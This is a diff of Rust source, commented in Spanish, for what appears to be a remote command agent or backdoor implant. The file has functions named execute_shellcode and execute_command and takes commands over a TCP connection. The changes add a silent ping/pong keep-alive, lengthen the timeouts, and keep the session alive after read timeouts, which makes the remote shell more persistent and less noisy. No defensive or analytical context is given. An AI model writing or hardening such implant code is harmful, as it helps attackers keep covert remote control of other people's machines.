@@ -83,11 +83,12 @@ fn execute_shellcode() {
 }
 
 fn execute_command(cmd: &str) -> String {
-    println!("DEBUG: Ejecutando comando: '{}'", cmd);
-
+    // Manejar ping silenciosamente (keep-alive)
     if cmd == "ping" {
         return "pong".to_string();
     }
+
+    println!("DEBUG: Ejecutando comando: '{}'", cmd);
 
     if cmd == "exit" {
         std::process::exit(0);
@@ -122,8 +123,9 @@ fn execute_command(cmd: &str) -> String {
 fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
     println!("DEBUG: Conexión establecida");
 
-    stream.set_read_timeout(Some(Duration::from_secs(60)))?;
-    stream.set_write_timeout(Some(Duration::from_secs(10)))?;
+    // Timeouts más largos para evitar desconexiones
+    stream.set_read_timeout(Some(Duration::from_secs(300)))?; // 5 minutos
+    stream.set_write_timeout(Some(Duration::from_secs(30)))?;
     stream.set_nodelay(true)?;
 
     let mut reader = BufReader::new(stream.try_clone()?);
@@ -166,6 +168,12 @@ fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>
                 }
             }
             Err(e) => {
+                // Distinguir entre timeout y error real
+                if e.kind() == std::io::ErrorKind::WouldBlock 
+                    || e.kind() == std::io::ErrorKind::TimedOut {
+                    println!("DEBUG: Timeout en lectura, continuando...");
+                    continue;
+                }
                 println!("DEBUG: Error leyendo comando: {}", e);
                 return Err(e.into());
             }
